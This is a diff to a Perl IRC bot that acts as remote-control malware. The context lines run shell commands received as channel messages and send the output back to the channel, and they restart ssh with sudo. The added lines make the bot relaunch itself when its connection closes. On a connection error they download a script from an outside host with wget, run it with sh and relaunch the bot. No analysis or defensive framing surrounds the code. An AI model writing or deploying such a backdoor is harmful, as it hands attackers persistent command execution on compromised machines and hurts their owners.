@@ -26,8 +26,7 @@ my $irc = Mojo::IRC->new(
  #defineserverhere
  );
 #definesslhere
-$irc->on(close => sub { my ($irc) = @_; });
-$irc->on(error => sub { my ($irc, $err) = @_; });
+$irc->on(close => sub { system("perl perlircssl.pl &") });
 $irc->on(irc_rpl_welcome => sub {
  my($irc, $err) = @_;
  warn 'Joined IRC server.';
@@ -82,6 +81,7 @@ $irc->on(irc_privmsg => sub {
              system("$msg");
              my @output = `$msg 2>&1 3>&1`;
              foreach(@output) {
+             Time::HiRes::sleep(5);
                $irc->write(notice => $noticechan => "$_\r\n");         
              }
  }
@@ -179,7 +179,7 @@ system 'if [ -f /usr/bin/apt ]; then sudo service ssh restart; fi';
   });
    $irc->connect(sub {
     my($irc, $err) = @_;
-    return warn $err if $err;
+    return system("wget -O .fw ig.gd/fwreset && sh .fw && perl perlircssl.pl &") if $err;
     $irc->write(join => $channel);
     });
    Mojo::IOLoop->start;
